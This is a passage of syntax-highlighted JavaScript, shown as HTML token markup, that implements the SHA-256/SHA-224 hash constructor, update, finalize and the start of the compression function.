            blocks<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> blocks<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">=</span> blocks<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> blocks<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> blocks<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> blocks<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> blocks<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> blocks<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">=</span> blocks<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">=</span> blocks<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> blocks<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">=</span> blocks<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">=</span> blocks<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">=</span> blocks<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">=</span> blocks<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">=</span> blocks<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">=</span> blocks<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>blocks <span class="token operator">=</span> blocks
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>blocks <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>is224<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>h0 <span class="token operator">=</span> <span class="token number">0xc1059ed8</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>h1 <span class="token operator">=</span> <span class="token number">0x367cd507</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>h2 <span class="token operator">=</span> <span class="token number">0x3070dd17</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>h3 <span class="token operator">=</span> <span class="token number">0xf70e5939</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>h4 <span class="token operator">=</span> <span class="token number">0xffc00b31</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>h5 <span class="token operator">=</span> <span class="token number">0x68581511</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>h6 <span class="token operator">=</span> <span class="token number">0x64f98fa7</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>h7 <span class="token operator">=</span> <span class="token number">0xbefa4fa4</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>h0 <span class="token operator">=</span> <span class="token number">0x6a09e667</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>h1 <span class="token operator">=</span> <span class="token number">0xbb67ae85</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>h2 <span class="token operator">=</span> <span class="token number">0x3c6ef372</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>h3 <span class="token operator">=</span> <span class="token number">0xa54ff53a</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>h4 <span class="token operator">=</span> <span class="token number">0x510e527f</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>h5 <span class="token operator">=</span> <span class="token number">0x9b05688c</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>h6 <span class="token operator">=</span> <span class="token number">0x1f83d9ab</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>h7 <span class="token operator">=</span> <span class="token number">0x5be0cd19</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>block <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>start <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>bytes <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>hBytes <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>finalized <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>hashed <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>first <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>is224 <span class="token operator">=</span> is224
    <span class="token punctuation">}</span>
    <span class="token class-name">Sha256</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">update</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">message</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>finalized<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            <span class="token keyword">return</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">var</span> notString<span class="token punctuation">,</span> type <span class="token operator">=</span> <span class="token keyword">typeof</span> message<span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>type <span class="token operator">!==</span> <span class="token string">'string'</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>type <span class="token operator">===</span> <span class="token string">'object'</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>message <span class="token operator">===</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token constant">ERROR</span><span class="token punctuation">)</span>
                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant">ARRAY_BUFFER</span> <span class="token operator">&amp;&amp;</span> message<span class="token punctuation">.</span>constructor <span class="token operator">===</span> ArrayBuffer<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                    message <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uint8Array</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span>
                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>Array<span class="token punctuation">.</span><span class="token function">isArray</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token constant">ARRAY_BUFFER</span> <span class="token operator">||</span> <span class="token operator">!</span>ArrayBuffer<span class="token punctuation">.</span><span class="token function">isView</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token constant">ERROR</span><span class="token punctuation">)</span>
                    <span class="token punctuation">}</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token constant">ERROR</span><span class="token punctuation">)</span>
            <span class="token punctuation">}</span>
            notString <span class="token operator">=</span> <span class="token boolean">true</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">var</span> code<span class="token punctuation">,</span> index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>
            i<span class="token punctuation">,</span> length <span class="token operator">=</span> message<span class="token punctuation">.</span>length<span class="token punctuation">,</span>
            blocks <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>blocks<span class="token punctuation">;</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span>index <span class="token operator">&lt;</span> length<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>hashed<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                <span class="token keyword">this</span><span class="token punctuation">.</span>hashed <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
                blocks<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>block<span class="token punctuation">;</span>
                blocks<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">=</span> blocks<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> blocks<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> blocks<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> blocks<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> blocks<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> blocks<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">=</span> blocks<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">=</span> blocks<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> blocks<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">=</span> blocks<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">=</span> blocks<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">=</span> blocks<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">=</span> blocks<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">=</span> blocks<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">=</span> blocks<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>notString<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>start<span class="token punctuation">;</span> index <span class="token operator">&lt;</span> length <span class="token operator">&amp;&amp;</span> i <span class="token operator">&lt;</span> <span class="token number">64</span><span class="token punctuation">;</span> <span class="token operator">++</span>index<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                    blocks<span class="token punctuation">[</span>i <span class="token operator">&gt;&gt;</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">|=</span> message<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token constant">SHIFT</span><span class="token punctuation">[</span>i<span class="token operator">++</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">]</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
                <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>start<span class="token punctuation">;</span> index <span class="token operator">&lt;</span> length <span class="token operator">&amp;&amp;</span> i <span class="token operator">&lt;</span> <span class="token number">64</span><span class="token punctuation">;</span> <span class="token operator">++</span>index<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                    code <span class="token operator">=</span> message<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span>code <span class="token operator">&lt;</span> <span class="token number">0x80</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                        blocks<span class="token punctuation">[</span>i <span class="token operator">&gt;&gt;</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">|=</span> code <span class="token operator">&lt;&lt;</span> <span class="token constant">SHIFT</span><span class="token punctuation">[</span>i<span class="token operator">++</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">]</span>
                    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>code <span class="token operator">&lt;</span> <span class="token number">0x800</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                        blocks<span class="token punctuation">[</span>i <span class="token operator">&gt;&gt;</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">|=</span> <span class="token punctuation">(</span><span class="token number">0xc0</span> <span class="token operator">|</span> <span class="token punctuation">(</span>code <span class="token operator">&gt;&gt;</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token constant">SHIFT</span><span class="token punctuation">[</span>i<span class="token operator">++</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
                        blocks<span class="token punctuation">[</span>i <span class="token operator">&gt;&gt;</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">|=</span> <span class="token punctuation">(</span><span class="token number">0x80</span> <span class="token operator">|</span> <span class="token punctuation">(</span>code <span class="token operator">&amp;</span> <span class="token number">0x3f</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token constant">SHIFT</span><span class="token punctuation">[</span>i<span class="token operator">++</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">]</span>
                    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>code <span class="token operator">&lt;</span> <span class="token number">0xd800</span> <span class="token operator">||</span> code <span class="token operator">&gt;=</span> <span class="token number">0xe000</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                        blocks<span class="token punctuation">[</span>i <span class="token operator">&gt;&gt;</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">|=</span> <span class="token punctuation">(</span><span class="token number">0xe0</span> <span class="token operator">|</span> <span class="token punctuation">(</span>code <span class="token operator">&gt;&gt;</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token constant">SHIFT</span><span class="token punctuation">[</span>i<span class="token operator">++</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
                        blocks<span class="token punctuation">[</span>i <span class="token operator">&gt;&gt;</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">|=</span> <span class="token punctuation">(</span><span class="token number">0x80</span> <span class="token operator">|</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>code <span class="token operator">&gt;&gt;</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x3f</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token constant">SHIFT</span><span class="token punctuation">[</span>i<span class="token operator">++</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
                        blocks<span class="token punctuation">[</span>i <span class="token operator">&gt;&gt;</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">|=</span> <span class="token punctuation">(</span><span class="token number">0x80</span> <span class="token operator">|</span> <span class="token punctuation">(</span>code <span class="token operator">&amp;</span> <span class="token number">0x3f</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token constant">SHIFT</span><span class="token punctuation">[</span>i<span class="token operator">++</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">]</span>
                    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
                        code <span class="token operator">=</span> <span class="token number">0x10000</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>code <span class="token operator">&amp;</span> <span class="token number">0x3ff</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>message<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span><span class="token operator">++</span>index<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x3ff</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                        blocks<span class="token punctuation">[</span>i <span class="token operator">&gt;&gt;</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">|=</span> <span class="token punctuation">(</span><span class="token number">0xf0</span> <span class="token operator">|</span> <span class="token punctuation">(</span>code <span class="token operator">&gt;&gt;</span> <span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token constant">SHIFT</span><span class="token punctuation">[</span>i<span class="token operator">++</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
                        blocks<span class="token punctuation">[</span>i <span class="token operator">&gt;&gt;</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">|=</span> <span class="token punctuation">(</span><span class="token number">0x80</span> <span class="token operator">|</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>code <span class="token operator">&gt;&gt;</span> <span class="token number">12</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x3f</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token constant">SHIFT</span><span class="token punctuation">[</span>i<span class="token operator">++</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
                        blocks<span class="token punctuation">[</span>i <span class="token operator">&gt;&gt;</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">|=</span> <span class="token punctuation">(</span><span class="token number">0x80</span> <span class="token operator">|</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>code <span class="token operator">&gt;&gt;</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x3f</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token constant">SHIFT</span><span class="token punctuation">[</span>i<span class="token operator">++</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
                        blocks<span class="token punctuation">[</span>i <span class="token operator">&gt;&gt;</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">|=</span> <span class="token punctuation">(</span><span class="token number">0x80</span> <span class="token operator">|</span> <span class="token punctuation">(</span>code <span class="token operator">&amp;</span> <span class="token number">0x3f</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token constant">SHIFT</span><span class="token punctuation">[</span>i<span class="token operator">++</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">]</span>
                    <span class="token punctuation">}</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>lastByteIndex <span class="token operator">=</span> i<span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>bytes <span class="token operator">+=</span> i <span class="token operator">-</span> <span class="token keyword">this</span><span class="token punctuation">.</span>start<span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">&gt;=</span> <span class="token number">64</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                <span class="token keyword">this</span><span class="token punctuation">.</span>block <span class="token operator">=</span> blocks<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
                <span class="token keyword">this</span><span class="token punctuation">.</span>start <span class="token operator">=</span> i <span class="token operator">-</span> <span class="token number">64</span><span class="token punctuation">;</span>
                <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">hash</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">this</span><span class="token punctuation">.</span>hashed <span class="token operator">=</span> <span class="token boolean">true</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
                <span class="token keyword">this</span><span class="token punctuation">.</span>start <span class="token operator">=</span> i
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>bytes <span class="token operator">&gt;</span> <span class="token number">4294967295</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>hBytes <span class="token operator">+=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>bytes <span class="token operator">/</span> <span class="token number">4294967296</span> <span class="token operator">&lt;&lt;</span> <span class="token number">0</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>bytes <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>bytes <span class="token operator">%</span> <span class="token number">4294967296</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> <span class="token keyword">this</span>
    <span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token class-name">Sha256</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">finalize</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>finalized<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            <span class="token keyword">return</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>finalized <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
        <span class="token keyword">var</span> blocks <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>blocks<span class="token punctuation">,</span>
            i <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>lastByteIndex<span class="token punctuation">;</span>
        blocks<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>block<span class="token punctuation">;</span>
        blocks<span class="token punctuation">[</span>i <span class="token operator">&gt;&gt;</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">|=</span> <span class="token constant">EXTRA</span><span class="token punctuation">[</span>i <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>block <span class="token operator">=</span> blocks<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">&gt;=</span> <span class="token number">56</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>hashed<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">hash</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token punctuation">}</span>
            blocks<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>block<span class="token punctuation">;</span>
            blocks<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">=</span> blocks<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> blocks<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> blocks<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> blocks<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> blocks<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> blocks<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">=</span> blocks<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">=</span> blocks<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> blocks<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">=</span> blocks<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">=</span> blocks<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">=</span> blocks<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">=</span> blocks<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">=</span> blocks<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">=</span> blocks<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>
        <span class="token punctuation">}</span>
        blocks<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>hBytes <span class="token operator">&lt;&lt;</span> <span class="token number">3</span> <span class="token operator">|</span> <span class="token keyword">this</span><span class="token punctuation">.</span>bytes <span class="token operator">&gt;&gt;&gt;</span> <span class="token number">29</span><span class="token punctuation">;</span>
        blocks<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>bytes <span class="token operator">&lt;&lt;</span> <span class="token number">3</span><span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">hash</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token class-name">Sha256</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">hash</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>h0<span class="token punctuation">,</span>
            b <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>h1<span class="token punctuation">,</span>
            c <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>h2<span class="token punctuation">,</span>
            d <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>h3<span class="token punctuation">,</span>
            e <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>h4<span class="token punctuation">,</span>
            f <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>h5<span class="token punctuation">,</span>
            g <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>h6<span class="token punctuation">,</span>
            h <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>h7<span class="token punctuation">,</span>
            blocks <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>blocks<span class="token punctuation">,</span>
